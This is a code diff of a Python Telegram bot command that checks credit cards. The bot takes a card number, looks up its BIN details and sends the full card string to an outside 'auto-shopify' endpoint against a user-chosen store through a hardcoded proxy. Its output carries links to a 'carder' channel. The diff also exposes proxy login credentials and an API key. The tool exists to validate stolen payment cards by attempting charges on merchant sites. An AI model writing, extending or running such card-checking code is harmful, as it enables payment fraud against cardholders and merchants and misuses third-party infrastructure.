@@ -2878,59 +2878,6 @@ async def consume_credit(user_id: int) -> bool:
         return True
     return False
 
-async def get_bin_details(bin_number: str) -> dict:
-    """
-    Fetch BIN details from bintable API.
-    """
-    bin_data = {
-        "scheme": "N/A",
-        "type": "N/A",
-        "level": "N/A",
-        "bank": "N/A",
-        "country_name": "N/A",
-        "country_emoji": "",
-        "vbv_status": None,
-        "card_type": "N/A"
-    }
-
-    url = f"https://api.bintable.com/v1/{bin_number}?api_key=a48d5b84128681e7b724ed6cb4b6420582847c69"
-    headers = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}
-
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get(url, headers=headers, timeout=7) as response:
-                if response.status == 200:
-                    try:
-                        data = await response.json(content_type=None)
-                        if data.get("result") == 200 and "data" in data:
-                            card = data["data"].get("card", {})
-                            country = data["data"].get("country", {})
-                            bank = data["data"].get("bank", {})
-
-                            bin_data["scheme"] = str(card.get("scheme", "N/A")).title()
-                            bin_data["type"] = str(card.get("type", "N/A")).title()
-                            bin_data["card_type"] = str(card.get("type", "N/A")).title()
-                            bin_data["level"] = str(card.get("category", "N/A")).title()
-                            bin_data["bank"] = str(bank.get("name", "N/A")).title()
-                            bin_data["country_name"] = country.get("name", "N/A")
-                            bin_data["country_emoji"] = country.get("flag", "")
-                            return bin_data
-                    except Exception as e:
-                        logger.warning(f"JSON parse error for BIN {bin_number}: {e}")
-                else:
-                    logger.warning(f"BIN API returned {response.status} for BIN {bin_number}")
-    except Exception as e:
-        logger.warning(f"BIN API call failed for {bin_number}: {e}")
-
-    return bin_data
-
-API_CHECK_TEMPLATE = (
-    "https://auto-shopify-6cz4.onrender.com/index.php"
-    "?site={site}"
-    "&cc={card}"
-    "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
-)
-
 import re
 import json
 import aiohttp
@@ -2941,7 +2888,18 @@ from telegram import Update
 from telegram.constants import ParseMode
 from telegram.ext import ContextTypes
 
+from db import get_user, update_user   # your db functions
+from bin import get_bin_info           # your BIN function
 
+# ===== API template =====
+API_CHECK_TEMPLATE = (
+    "https://auto-shopify-6cz4.onrender.com/index.php"
+    "?site={site}"
+    "&cc={card}"
+    "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+)
+
+# ===== Main Command =====
 async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
@@ -2970,7 +2928,7 @@ async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     custom_url = user_data.get("custom_url")
     if not custom_url:
         await update.message.reply_text(
-            "❌ 𝘠𝘰𝘶 𝘥𝘰𝘯'𝘵 𝘩𝘢𝘷𝘦 𝘢 𝘴𝘪𝘵𝘦 𝘴𝘦𝘵. 𝘜𝘴𝘦 /seturl 𝘵𝘰 𝘴𝘦𝘵 𝘺𝘰𝘶𝘳 𝘴𝘪𝘵𝘦 𝘧𝘪𝘳𝘴𝘵.",
+            "❌ You don’t have a site set. Use /seturl to set your site first.",
             parse_mode=ParseMode.HTML
         )
         return
@@ -2981,39 +2939,51 @@ async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode=ParseMode.HTML
     )
 
-    # Run the actual heavy work in the background
+    # Run the actual heavy work in background
     asyncio.create_task(process_card_check(user, card_input, custom_url, msg))
 
 
+# ===== Worker =====
 async def process_card_check(user, card_input, custom_url, msg):
-    cc = card_input.split("|")[0]
-
-    # BIN lookup
-    parts = card_input.split("|")
-    bin_number = parts[0][:6]
-    bin_details = await get_bin_details(bin_number)
-
-    brand = (bin_details.get("scheme") or "N/A").title()
-    issuer = (bin_details.get("bank") or "N/A").title()
-    country_name = (bin_details.get("country_name") or "N/A")
-    country_flag = bin_details.get("country_emoji", "")
-
-    # API call
-    api_url = API_CHECK_TEMPLATE.format(card=card_input, site=custom_url)
     try:
+        cc = card_input.split("|")[0]
+
+        # --- BIN lookup (your exact logic, unchanged) ---
+        try:
+            bin_number = cc[:6]
+            bin_details = await get_bin_info(bin_number)
+
+            brand = (bin_details.get("scheme") or "N/A").title()
+            issuer = bin_details.get("bank") or "N/A"
+            country_name = bin_details.get("country") or "Unknown"
+            country_flag = bin_details.get("country_emoji", "")
+            card_type = bin_details.get("type", "N/A")
+            card_level = bin_details.get("brand", "N/A")
+            card_length = bin_details.get("length", "N/A")
+            luhn_check = bin_details.get("luhn", "N/A")
+            bank_phone = bin_details.get("bank_phone", "N/A")
+            bank_url = bin_details.get("bank_url", "N/A")
+        except Exception as e:
+            logging.warning(f"BIN lookup failed for {bin_number}: {e}")
+            brand = issuer = card_type = card_level = card_length = luhn_check = bank_phone = bank_url = "N/A"
+            country_name = "Unknown"
+            country_flag = ""
+
+        # --- API call ---
+        api_url = API_CHECK_TEMPLATE.format(card=card_input, site=custom_url)
         async with aiohttp.ClientSession() as session:
             async with session.get(api_url, timeout=120) as resp:
                 api_text = await resp.text()
 
-        # --- Detect HTML or PHP warnings ---
+        # Detect bad responses
         if '<!DOCTYPE html>' in api_text or '<html' in api_text:
             await msg.edit_text(
-                "❌ API endpoint is offline or returned HTML. Please check your ngrok URL.",
+                "❌ API endpoint is offline or returned HTML.",
                 parse_mode=ParseMode.HTML
             )
             return
 
-        # --- Strip PHP warnings / HTML tags ---
+        # Strip junk and find JSON
         clean_text = re.sub(r'<[^>]+>', '', api_text).strip()
         json_start = clean_text.find('{')
         if json_start != -1:
@@ -3023,37 +2993,35 @@ async def process_card_check(user, card_input, custom_url, msg):
             data = json.loads(clean_text)
         except json.JSONDecodeError:
             await msg.edit_text(
-                f"❌ Invalid API response:\n<pre>{escape(api_text)}</pre>",
+                f"❌ Invalid API response:\n<pre>{escape(api_text[:500])}</pre>",
                 parse_mode=ParseMode.HTML
             )
             return
 
-
         # Extract fields
         response_text = data.get("Response", "Unknown")
-        price = f"{data.get('Price', '1.0')}$"
-        gateway = data.get("Gateway", "-")
-        country = f"{country_flag} {country_name}"
+        price = f"{data.get('Price', '0')}$"
+        gateway = data.get("Gateway", "Shopify")
         requester = f"@{user.username}" if user.username else str(user.id)
 
+        # Developer/branding
         DEVELOPER_NAME = "kคli liຖนxx"
         DEVELOPER_LINK = "https://t.me/Kalinuxxx"
         developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"
 
         BULLET_GROUP_LINK = "https://t.me/CARDER33"
-        bullet_text = "[⌇]"
-        bullet_link = f'<a href="{BULLET_GROUP_LINK}">{bullet_text}</a>'
+        bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
 
         formatted_msg = (
             "═══[ 𝗔𝘂𝘁𝗼𝘀𝗵𝗼𝗽𝗶𝗳𝘆 ]═══\n\n"
             f"{bullet_link} 𝐂𝐚𝐫𝐝       ➜ <code>{card_input}</code>\n"
-            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲   ➜ 𝙎𝙝𝙤𝙥𝙞𝙛𝙮\n"
-            f"{bullet_link} 𝐀𝐦𝐨𝐮𝐧𝐭     ➜ {price}💸\n"
-            f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞   ➜ {response_text}\n\n"
+            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲   ➜ {escape(gateway)}\n"
+            f"{bullet_link} 𝐀𝐦𝐨𝐮𝐧𝐭     ➜ {price} 💸\n"
+            f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞   ➜ {escape(response_text)}\n\n"
             "――――――――――――――――\n"
             f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝      ➜ <code>{brand}</code>\n"
             f"{bullet_link} 𝐁𝐚𝐧𝐤       ➜ <code>{issuer}</code>\n"
-            f"{bullet_link} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲     ➜ <code>{country}</code>\n\n"
+            f"{bullet_link} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲    ➜ <code>{country_flag} {country_name}</code>\n\n"
             "――――――――――――――――\n"
             f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➜ {requester}\n"
             f"{bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➜ {developer_clickable}\n"
@@ -3067,16 +3035,14 @@ async def process_card_check(user, card_input, custom_url, msg):
         )
 
     except asyncio.TimeoutError:
-        await msg.edit_text(
-            "❌ Error: API request timed out. Try again later.",
-            parse_mode=ParseMode.HTML
-        )
+        await msg.edit_text("❌ Error: API request timed out.", parse_mode=ParseMode.HTML)
     except Exception as e:
-        logging.exception("Error in background card check")
+        logging.exception("Error in process_card_check")
         await msg.edit_text(
             f"❌ Error: <code>{escape(str(e))}</code>",
             parse_mode=ParseMode.HTML
         )
+
 
 
 
